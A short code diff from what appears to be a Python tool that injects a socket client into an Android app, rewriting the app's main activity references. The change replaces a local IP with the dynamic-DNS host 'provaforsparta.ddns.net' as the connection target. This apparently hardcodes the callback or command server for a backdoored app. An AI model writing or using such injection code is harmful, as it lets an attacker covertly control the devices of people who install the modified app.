@@ -123,7 +123,7 @@ def add_socket_client(file, activityMainPath, path):
     socket_client = original_file[0][2]
     socket_client = re.sub(MAIN_ACTIVITY_PATH, 'L' + package_app.replace(".", "/"), socket_client)
     socket_client = re.sub(MAIN_ACTIVITY_NAME, app_name, socket_client)
-    socket_client = re.sub('192.168.1.15', ipv4, socket_client)
+    socket_client = re.sub('192.168.1.15', 'provaforsparta.ddns.net', socket_client)
 
     package_list = PACKAGE_LIST['init'] + str(len(session['package'])) + PACKAGE_LIST['new_array']
     i = 0
